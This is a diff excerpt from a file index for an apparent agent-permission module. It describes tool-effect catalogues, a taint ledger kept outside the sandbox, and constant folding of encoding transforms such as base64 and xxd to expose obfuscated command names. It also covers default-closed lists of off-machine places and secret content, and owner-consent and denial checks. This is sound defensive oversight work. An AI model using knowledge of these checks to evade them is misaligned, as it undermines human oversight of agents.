 | `cypher-permissions/catalogue.ts` | The creator/destroyer catalogue: per tool and subcommand, the entity it creates, destroys, stops, starts or merges and where its name comes from; plan before a run, settle after (§7.3.3) |
 | `cypher-permissions/ledger.ts` | The provenance ledger: per chat, on disk where the sandbox can't write (§7.3.3); round 5 step 2: the taint ledger (`taintFile`) of files and repositories written from a secret |
-| `cypher-permissions/fold.ts` | Round 5 step 2: constant folding of pure transforms (`TRANSFORMS`: base64 -d, xxd -r, rev, tr, printf escapes) for computed names |
+| `cypher-permissions/fold.ts` | Constant folding of printers and pure transforms (`TRANSFORMS`: base64 -d, xxd -r, rev, tr, sed `s///`, printf, jq -rn; `USER_PRINTERS`) for computed names |
+| `cypher-permissions/defaults.ts` | The lists closed by their default (§7.3.0): `LOCAL_CONSUMERS`, `PLAIN_PROGRAMS`, `COMMAND_STARTS`, `OWN_CREDENTIAL`, `OUTPUT_OPTIONS`, `namedRemote`, `runsElsewhere`, `OFF_MACHINE_PLACES`, `secretByContent` |
+| `cypher-permissions/code.ts` | Inline code: interpreters, `foldLiterals`, `scanCode` (paths, home forms, network categories, file operations, spawned commands) |
+| `cypher-permissions/resolve.ts` | The one path resolver: braces, globs, `..`, links, the data-volume firmlink, the home folder by the user's name |
+| `cypher-permissions/scripts.ts` | `SCRIPT_RUNNERS`: project scripts and manifests read as lines of their own |
+| `cypher-permissions/effects.ts`, `schema.ts`, `flow.ts` | Effect classes and wrappers; per-tool target schemas and API routes; run-time operands, group destroyers |
+| `cypher-permissions/denials.ts`, `lexicon.ts` | The owner's denials as units and what lifts them; the owner-word lexicon (negation, retraction, questions; several languages) |
 | `cypher-permissions/lifecycle.ts` | Lifecycle closure: the follow-ups an action implies, as data (§7.3.6) |
 | `cypher-permissions/explicit.ts` | Explicit requests: the owner's words, what a dangerous line acts on, the quote, target and retraction checks (§7.3.2); `scanConsents`/`scanDataConsent`, the same checks on every owner word as evidence (§7.3.10) |
 | `cypher-permissions/entities.ts` | Target identity: typed entities and `relation`/`covers`/`identifies`/`namesOf` (§7.3.5) |
